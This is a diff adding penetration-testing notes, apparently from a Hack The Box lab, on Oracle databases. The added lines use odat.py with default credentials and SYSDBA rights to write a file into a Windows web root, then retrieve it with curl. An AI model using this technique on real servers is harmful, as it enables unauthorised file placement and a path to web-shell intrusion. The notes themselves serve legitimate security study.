@@ -205,3 +205,20 @@ LOGSTDBY_ADMINISTRATOR
 - Depending on the OS you can try these paths:
 	- Linux: `/var/www/html`
 	- Windows: `C:\inetpub\wwwroot`
+
+#### File upload
+```bash
+SonithGT@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
+SonithGT@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
+[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
+```
+
+#### Retrieving the above uploaded file
+```bash
+SonithGT@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
+
+Oracle File Upload Test
+
+```
